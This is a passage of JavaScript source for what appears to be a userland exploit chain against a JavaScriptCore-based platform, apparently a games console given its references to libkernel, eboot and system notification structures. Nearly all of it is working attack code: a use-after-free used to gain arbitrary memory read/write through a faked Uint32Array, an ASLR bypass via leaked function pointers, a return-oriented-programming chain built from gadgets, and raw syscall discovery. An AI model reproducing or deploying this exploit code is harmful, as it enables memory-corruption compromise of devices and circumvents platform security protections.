  var out_len_addr = alloc(8);

  view(name_addr).setUint32(0, 1, true);
  view(name_addr).setUint32(4, 0x26, true);

  view(out_len_addr).setBigInt(0, 8, true);

  if (sysctl.invoke(name_addr, 2, out_addr, out_len_addr, 0, 0).neq(0)) {
    throw new SyscallError(`Unable to sysctl name ${name_addr} !!`);
  }

  var major = view(out_addr).getUint8(3);
  var minor = view(out_addr).getUint8(2);

  dispose(name_addr);
  dispose(out_addr);
  dispose(out_len_addr);

  return { 
    major, 
    minor,
    toString() {
      return `${this.major}.${this.minor.toString(16).pad_start(2)}`;
    } 
  };
};

function atob(b64) {
  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var length = b64.length * 0.75;
  
  if (b64[b64.length - 1] === "=") {
    length--;
    if (b64[b64.length - 2] === "=") {
      length--;
    }
  }

  var bytes = new Uint8Array(length);

  var p = 0;
  for (var i = 0; i < b64.length; i += 4) {
    var encoded1 = chars.indexOf(b64[i]);
    var encoded2 = chars.indexOf(b64[i + 1]);
    var encoded3 = chars.indexOf(b64[i + 2]);
    var encoded4 = chars.indexOf(b64[i + 3]);

    bytes[p++] = (encoded1 << 2) | (encoded2 >> 4);
    if (encoded3 !== chars.length && encoded3 !== -1) {
      bytes[p++] = ((encoded2 & 15) << 4) | (encoded3 >> 2);
    }
    if (encoded4 !== chars.length && encoded4 !== -1) {
      bytes[p++] = ((encoded3 & 3) << 6) | encoded4;
    }
  }

  return bytes;
};

function read_file(path, flags, mode) {
  flags = typeof flags === "undefined" ? 0 : flags;
  mode = typeof mode === "undefined" ? 0 : mode;

  var fd = open.invoke(path, flags, mode);
  if (fd.eq(-1)) {
    throw new SyscallError(`Unable to open ${path} !!`)
  }

  var stat_addr = alloc(stat.sizeof);
  var fd_stat = stat.from(stat_addr);

  if (fstat.invoke(fd, fd_stat.addr).neq(0)) {
    throw new SyscallError(`Unable to get stat of fd ${fd} !!`)
  }

  var data_sz = fd_stat.st_size.valueOf();
  var data = new Uint8Array(data_sz);

  var n = read.invoke(fd, data.get_backing(), fd_stat.st_size)
  if (n.neq(fd_stat.st_size)) {
    throw new SyscallError(`Expected ${fd_stat.st_size} got ${n} !!`);
  }

  if (close.invoke(fd).neq(0)) {
    throw new SyscallError(`Unable to close fd ${fd} !!`);
  }

  dispose(stat_addr);

  return data;
};

function read_file_str(path, flags, mode) {
  var data = read_file(path, flags, mode);
  var data_addr = data.get_backing();
  data_addr.arr = data;
  
  return String.from(data_addr);
};

function init_arw() {
  if(typeof leak !== "undefined" && addrof(leak).eq(leak_addr)) {
    log("ARW already achieved !!");
    return;
  }

  log("Initiate UAF...");

  var uaf_u32 = new Uint32Array(0x40000);

  uaf_u32[4] = 0xB0; // m_hashAndFlags

  make_uaf(uaf_u32);

  log("Achieved UAF !!");

  log("Initiate ARW...");

  var marker = 0x1337;

  var boxed = -1;
  var unboxed = -1;

  log(`Spraying array with marker ${new BigInt(marker)} ...`);

  var spray = new Array(0x1000);
  for (var i = 0; i < spray.length; i++) {
    var arr = spray[i] = new Array(0x10);
    for (var j = 0; j < arr.length; j++) {
      arr[j] = j % 2 === 0 ? marker : (j * 0x10000 + i);
    }
  }

  log("Looking for marker in uaf_u32...");

  for (var i = 0; i < uaf_u32.length; i++) {
    if (uaf_u32[i] === marker) {
      log(`Found marker at uaf_u32[${i}] !!`);

      unboxed = i + 2;
      boxed = [uaf_u32[unboxed] & 0xFFFF, (uaf_u32[unboxed] >> 16) & 0xFFFF];

      break;
    }
  }

  if (unboxed === -1 || boxed === -1) {
    throw new Error("Unable to find marker !!");
  }

  debug(`boxed: ${boxed[0]} - ${boxed[1]}`);

  leak = { obj: 0 };

  spray[boxed[0]][boxed[1]] = leak;

  leak_addr = new BigInt(uaf_u32[unboxed + 1], uaf_u32[unboxed]);

  debug(`leak_addr: ${leak_addr}`);

  slave = new DataView(new ArrayBuffer(0x30));

  // spray Uint32Array to be used for fake Uint32Array structure id later
  var u32_spray = new Array(0x100);
  for (var i = 0; i < u32_spray.length; i++) {
    u32_spray[i] = new Uint32Array(1);
    u32_spray[i][`spray_${i}`] = i;
  }

  // try faking Uint32Array, we guess structure id by incrementing until it matches from one of sprayed earlier in u32_spray
  var indexing_type = 0; // IndexingType::NonArray
  var jstype = 0x23; // JSType::Uint32ArrayType
  var type_info = 0x60; // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
  var cell_type = 1; // CellType::DefinitelyWhite;
  var structure_id = 0x80; // StructureID

  var length_and_flags = new BigInt(1, 0x30);
  var jscell = new BigInt(indexing_type | (jstype << 8) | (type_info << 16) | (cell_type << 24), structure_id);

  var container = {
    jscell: jscell.jsv,
    butterfly: null, // NaN-boxed, fix later
    vector: slave,
    length_and_flags: length_and_flags.d, // NaN-boxed, fix later
  };

  spray[boxed[0]][boxed[1]] = container;

  var container_addr = new BigInt(uaf_u32[unboxed + 1], uaf_u32[unboxed]);

  debug(`container_addr: ${container_addr}`);

  var fake_addr = container_addr.add(0x10);

  debug(`fake_addr: ${fake_addr}`);

  uaf_u32[unboxed] = fake_addr.lo;
  uaf_u32[unboxed + 1] = fake_addr.hi;

  var fake = spray[boxed[0]][boxed[1]];

  while (!(fake instanceof Uint32Array)) {
    jscell.lo += 1;
    container.jscell = jscell.jsv;
  }

  // Fix fake
  fake[4] = fake_addr.lo;
  fake[5] = fake_addr.hi;

  slave.setBigInt(8, 0, true);
  slave.setBigInt(0x18, length_and_flags, true);

  // create valid Uint32Array as TypedArrayMode::WastefulTypedArray
  master = new Uint32Array(fake.buffer);

  // Fix slave
  slave.set_length(-1);

  // cleanup container
  delete container.jscell;
  delete container.butterfly;
  delete container.vector;
  delete container.length_and_flags;

  log("Achieved ARW !!");
};

function init_aslr() {
  log("Initiate ASLR bypass...");

  var math_expm1_addr = addrof(Math.expm1);
  debug(`addrof(Math.expm1): ${math_expm1_addr}`);

  scope = view(math_expm1_addr).getBigInt(0x10, true);
  debug(`scope: ${scope}`);

  native_executable = view(math_expm1_addr).getBigInt(0x18, true);
  debug(`native_executable: ${native_executable}`);

  var native_executable_function = view(native_executable).getBigInt(0x40, true);
  debug(`native_executable_function: ${native_executable_function}`);

  var native_executable_constructor = view(native_executable).getBigInt(0x48, true);
  debug(`native_executable_constructor: ${native_executable_constructor}`);

  jsc_base = native_executable_constructor.sub(0x43E00);

  view(jsc_base).setUint32(0x1E75B20, 1, true)
  log("Disabled GC");

  _error_addr = view(jsc_base).getBigInt(0x1E72398, true);
  debug(`_error_addr: ${_error_addr}`);

  strerror_addr = view(jsc_base).getBigInt(0x1E723b8, true);
  debug(`strerror_addr: ${strerror_addr}`);

  libc_base = strerror_addr.sub(0x40410);

  if (typeof jsmaf !== "undefined") {
    var jsmaf_gc_addr = addrof(jsmaf.gc);
    debug(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`);

    native_invoke_addr = view(jsmaf_gc_addr).getBigInt(0x18, true);
    debug(`native_invoke_addr: ${native_invoke_addr}`);
  }

  log("Achieved ASLR bypass !!");
};

function init_rop() {
  log("Initiate ROP...");

  gadgets.init(jsc_base);

  fn_frame = new Frame(["rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);
  fn_stack = new Stack(0x2000);
  fn_pivot = new Pivot();

  debug(`fn_frame: ${fn_frame.addr}`);
  
  fn_insts = [];
  fn_insts.push(gadgets.PUSH_RBP_POP_RCX_RET);
  fn_insts.push(gadgets.MOV_RAX_RCX_RET);

  fn_frame.store(fn_insts, "rsp");

  fn_insts.push(gadgets.POP_RAX_RET);
  fn_frame.valueof(fn_insts, "rax");

  fn_insts.push(gadgets.POP_RDI_RET);
  fn_frame.valueof(fn_insts, "rdi");

  fn_insts.push(gadgets.POP_RSI_RET);
  fn_frame.valueof(fn_insts, "rsi");

  fn_insts.push(gadgets.POP_RDX_RET);
  fn_frame.valueof(fn_insts, "rdx");

  fn_insts.push(gadgets.POP_RCX_RET);
  fn_frame.valueof(fn_insts, "rcx");

  fn_insts.push(gadgets.POP_R8_RET);
  fn_frame.valueof(fn_insts, "r8");

  fn_insts.push(gadgets.POP_R9_JO_RET);
  fn_frame.valueof(fn_insts, "r9");

  fn_frame.valueof(fn_insts, "rip");

  fn_frame.store(fn_insts, "rax");
  fn_frame.load(fn_insts, "rsp");

  fn_insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
  fn_insts.push(gadgets.POP_RAX_RET);
  fn_insts.push(0);
  fn_insts.push(gadgets.LEAVE_RET);

  view(native_executable).setBigInt(0x40, gadgets.MOV_RAX_QWORD_PTR_RDI_38_JMP_QWORD_PTR_RAX_18, true);
  
  log("Achieved ROP !!");

  sceKernelGetModuleInfoForUnwind = new NativeFunction(libc_base.add(0x5F0), "bigint");
  _error = new NativeFunction(_error_addr, "bigint");
  _strerror = new NativeFunction(strerror_addr, "string");

  libkernel_base = base_addr(_error_addr);
  if (typeof native_invoke_addr !== "undefined") {
    eboot_base = base_addr(native_invoke_addr);
  }
};

function init_syscall() {
  log("Initiate SYSCALL...");

  scan_syscalls(libkernel_base);

  // syscall functions
  read = new NativeFunction(0x3, "bigint");
  write = new NativeFunction(0x4, "bigint");
  open = new NativeFunction(0x5, "bigint");
  close = new NativeFunction(0x6, "bigint");
  fstat = new NativeFunction(0xBD, "bigint");
  sysctl = new NativeFunction(0xCA, "bigint");

  log("Initiated SYSCALL !!");
};

function scan_syscalls(base) {
  if (syscalls.size > 0) {
    log(`Already found ${syscalls.size} syscalls !!`);
    return;
  }

  var size = 0x40000;
  var pattern = [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05];
  var pattern_end = pattern.length - 1;

  var u8 = Uint8Array.from(base, size);

  var i = 0;
  var match = 0;
  var offset = 0;
  while (offset < size) {
    var b = u8[offset];
    var c = pattern[i];

    if (b === c || c === 0xFF) {
      if (i === 0) {
        match = offset;
      }

      i++;

      if (i === pattern_end) {
        var addr = base.add(match);
        var id = view(addr).getInt32(3, true);

        syscalls.set(id, addr);

        i = 0;
      }
    } else {
      i = 0;
    }

    offset++;
  }

  log(`Found ${syscalls.size} syscalls`);
};
//#endregion
//#region Structs
var timespec = timespec || new Struct("timespec", [
  { type: "Int64", name: "tv_sec" },
  { type: "Int64", name: "tv_nsec" },
]);

var stat = stat || new Struct("stat", [
  { type: "Uint32", name: "st_dev" },
  { type: "Uint32", name: "st_ino" },
  { type: "Uint16", name: "st_mode" },
  { type: "Uint16", name: "st_nlink" },
  { type: "Uint32", name: "st_uid" },
  { type: "Uint32", name: "st_gid" },
  { type: "Uint32", name: "st_rdev" },
  { type: "timespec", name: "st_atim" },
  { type: "timespec", name: "st_mtim" },
  { type: "timespec", name: "st_ctim" },
  { type: "Int64", name: "st_size" },
  { type: "Int64", name: "st_blocks" },
  { type: "Int32", name: "st_blksize" },
  { type: "Uint32", name: "st_flags" },
  { type: "Uint32", name: "st_gen" },
  { type: "timespec", name: "st_birthtim" },
]);

var ModuleInfoForUnwind = ModuleInfoForUnwind || new Struct("ModuleInfoForUnwind", [
  { type: "Uint64", name: "st_size" },
  { type: "Uint8", name: "name", count: 256 },
  { type: "Uint64", name: "eh_frame_hdr_addr" },
  { type: "Uint64", name: "eh_frame_addr" },
  { type: "Uint64", name: "eh_frame_size" },
  { type: "Uint64", name: "seg0_addr" },
  { type: "Uint64", name: "seg0_size" },
]);

var NotificationRequest = NotificationRequest || new Struct("NotificationRequest", [
  { type: "Int32", name: "type" },
  { type: "Int32", name: "reqId" },
  { type: "Int32", name: "priority" },
  { type: "Int32", name: "msg_id" },
  { type: "Int32", name: "target_id" },
  { type: "Int32", name: "user_id" },
  { type: "Int32", name: "unk1" },
  { type: "Int32", name: "unk2" },
  { type: "Int32", name: "app_id" },
  { type: "Int32", name: "error_num" },
  { type: "Int32", name: "unk3" },
  { type: "Uint8", name: "use_icon_image_uri" },
  { type: "Uint8", name: "message", count: 1024 },
  { type: "Uint8", name: "icon_uri", count: 1024 },
  { type: "Uint8", name: "unk", count: 1024 },
]);
//#endregion

log("===USERLAND===");

init_arw();
init_aslr();
init_rop();
init_syscall();

log(`jsc base: ${jsc_base}`);
log(`libc base: ${libc_base}`);
log(`libkernel base: ${libkernel_base}`);
if(typeof eboot_base !== "undefined") {
  log(`eboot base: ${eboot_base}`);
}

var version = sdk_version();

log(`SDK version: ${version}`);

log("===END===");